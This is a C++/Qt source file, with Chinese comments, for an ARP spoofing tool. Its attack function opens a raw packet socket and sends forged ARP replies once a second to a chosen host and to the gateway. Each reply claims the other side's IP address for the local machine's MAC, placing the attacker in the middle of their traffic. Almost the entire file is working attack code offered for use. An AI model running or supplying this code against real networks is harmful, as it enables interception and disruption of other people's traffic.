#include "attackfunc.h"

/*ARP包结构*/
/*字段顺序不可更改，发包时是直接将buffer发出*/
struct arp_head
{
    unsigned short hardware_type;   //硬件类型#1:Ethernet
    unsigned short protocol_type;   //协议类型#0x0800:IPv4
    unsigned char hardware_size;    //MAC地址长度#6
    unsigned char protocol_size;    //IP地址长度#4
    unsigned short opcode;          //ARP类型#1:request;2:reply
    unsigned char sender_mac[ETH_ALEN];    //源MAC地址
    unsigned char sender_ip[IPV4_LENGTH];  //源IP地址
    unsigned char target_mac[ETH_ALEN];    //目标MAC地址
    unsigned char target_ip[IPV4_LENGTH];  //目标IP地址
};

attackFunc::attackFunc(QObject *parent) : QObject(parent){
    isRunning = true;
}

void attackFunc::setFlag(bool flag){
    isRunning = flag;
}

void attackFunc::attack(QString source_ip_c, QString target_ip_c, QString source_mac, QString target_mac, QString dev){
    unsigned char sender_ip[4] = {0};
    charToInt(sender_ip, source_ip_c.toLocal8Bit().data());        //ARP回复的源IP
    qDebug() << source_ip_c;
    unsigned char target_ip[4] = {0};
    charToInt(target_ip, target_ip_c.toLocal8Bit().data());        //ARP回复的目标IP
    qDebug() << target_ip_c;
    unsigned char sender_ip_gateway[4] = {0};
    charToInt(sender_ip_gateway, target_ip_c.toLocal8Bit().data());
    unsigned char target_ip_gateway[4] = {0};
    charToInt(target_ip_gateway, source_ip_c.toLocal8Bit().data());

    //创建buffer
    unsigned char buffer[buffer_len];
    memset(buffer, 0, buffer_len);
    //创建以太网头部指针,指向buffer
    struct ethhdr *eth_ans = (struct ethhdr*)buffer;
    //创建ARP包指针，指向buffer的后46字节，因为以太网头包含：2*6B(MAC地址)+2B(协议地址)=14B
    struct arp_head *arp_ans = (struct arp_head*)(buffer+14);
    //创建sockaddr_ll结构地址
    struct sockaddr_ll sock_addr;
    int sock_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if(sock_fd == -1){
        perror("socket()");
        exit(-1);
    }
    struct ifreq ifr;

    /*根据网卡设备名获取Index*/
    strcpy(ifr.ifr_name, dev.toLocal8Bit().data());
    if(ioctl(sock_fd, SIOCGIFINDEX, &ifr) == -1)
    {
        perror("SIOCGIFINDEX");
        exit(-1);
    }
    int ifindex = ifr.ifr_ifindex;
    printf("网卡索引为:%d\n",ifindex);

     /*获取网卡设备MAC地址*/
    if(ioctl(sock_fd, SIOCGIFHWADDR, &ifr) == -1){
        perror("SIOCGIFHWADDR");
        exit(-1);
    }
    // unsigned char smac[ETH_ALEN] = {0x00,0x0C,0x29,0x59,0x6D,0x4B};
    unsigned char dmac[ETH_ALEN] = {0x00,0x0c,0x29,0x5e,0xcd,0x99};
    str2Mac(dmac, target_mac.toLocal8Bit().data());
    unsigned char dmac_gateway[ETH_ALEN] = {0x00,0x50,0x56,0xfa,0x55,0xfb};
    str2Mac(dmac_gateway, source_mac.toLocal8Bit().data());

    /*将MAC地址写入所需结构*/
    for(int i=0;i<6;i++){
        //以太网帧的目标MAC
        eth_ans->h_dest[i] = (unsigned char)dmac[i];
        //ARP回复包目标MAC
        arp_ans->target_mac[i] = (unsigned char)dmac[i];
        //以太网帧源MAC，即本机MAC
        //ifr_hwaddr是sockaddr结构体格式
        eth_ans->h_source[i] = (unsigned char)ifr.ifr_hwaddr.sa_data[i];
        //ARP请求包源MAC，即本机MAC
        arp_ans->sender_mac[i] = (unsigned char)ifr.ifr_hwaddr.sa_data[i];
        //sockaddr中的MAC，也是本地MAC
        sock_addr.sll_addr[i] = (unsigned char)ifr.ifr_hwaddr.sa_data[i];
    }

    /*完善sockaddr_ll结构体*/
    sock_addr.sll_family = PF_PACKET;
    sock_addr.sll_protocol = htons(ETH_P_ARP);
    sock_addr.sll_ifindex = ifindex;
    sock_addr.sll_hatype = htons(ARPHRD_ETHER);
    sock_addr.sll_halen = ETH_ALEN;

    /*完善以太网帧头*/
    eth_ans->h_proto = htons(ETH_P_ARP);

    /*完善ARP包头*/
    arp_ans->hardware_type = htons(0x01);
    arp_ans->protocol_type = htons(ETH_P_IP);
    arp_ans->hardware_size = ETH_ALEN;
    arp_ans->protocol_size = IPV4_LENGTH;
    arp_ans->opcode = htons(ARPOP_REPLY);

    /*发送ARP_Reply*/
    while(isRunning){//使用循环不断的发送arp欺骗包，从而淹没正常的arp请求
        //欺骗目标主机
        for(int i=0;i<6;i++){
            //以太网帧的目标MAC
            eth_ans->h_dest[i] = (unsigned char)dmac[i];
            //ARP回复包目标MAC
            arp_ans->target_mac[i] = (unsigned char)dmac[i];
        }
        memcpy(arp_ans->sender_ip,sender_ip,IPV4_LENGTH);
        memcpy(arp_ans->target_ip,target_ip,IPV4_LENGTH);
        if(sendto(sock_fd, buffer, 60, 0, (struct sockaddr*)&sock_addr, sizeof(sock_addr)) == -1){
            perror("sendto()");
            exit(-1);
        }

        //欺骗网关
        for(int i=0;i<6;i++){
            //以太网帧的目标MAC
            eth_ans->h_dest[i] = (unsigned char)dmac_gateway[i];
            //ARP回复包目标MAC
            arp_ans->target_mac[i] = (unsigned char)dmac_gateway[i];
        }
        memcpy(arp_ans->sender_ip,sender_ip_gateway,IPV4_LENGTH);
        memcpy(arp_ans->target_ip,target_ip_gateway,IPV4_LENGTH);
        if(sendto(sock_fd, buffer, 60, 0, (struct sockaddr*)&sock_addr, sizeof(sock_addr)) == -1){
            perror("sendto()");
            exit(-1);
        }
        sleep(1);
    }
    printf("finnsh attack\n");
    ::close(sock_fd);
}

void attackFunc::charToInt(unsigned char *IP, char *str){
    int j=0;
    for(int i=0; i<4;i++){
        int num = 0;
        for(; j<(int)strlen(str); j++){
            if( str[j] == '.' ){
                j++;
                break;
            }
            else{
                num *= 10;
                num += str[j] -'0';
            }
        }
        IP[i] = num;
    }
}

void attackFunc::str2Mac(unsigned char *Mac, char *str){
    char *temp = str;
    for (int i = 0; i < 6; ++i)  {
        Mac[i] = charToData(*temp++) * 16;
        Mac[i] += charToData(*temp++);
        temp++;
    }
}

unsigned char attackFunc::charToData(const char ch){
    switch(ch){
        case '0': return 0;
        case '1': return 1;
        case '2': return 2;
        case '3': return 3;
        case '4': return 4;
        case '5': return 5;
        case '6': return 6;
        case '7': return 7;
        case '8': return 8;
        case '9': return 9;
        case 'a':
        case 'A': return 10;
        case 'b':
        case 'B': return 11;
        case 'c':
        case 'C': return 12;
        case 'd':
        case 'D': return 13;
        case 'e':
        case 'E': return 14;
        case 'f':
        case 'F': return 15;
    }
    return 0;
}

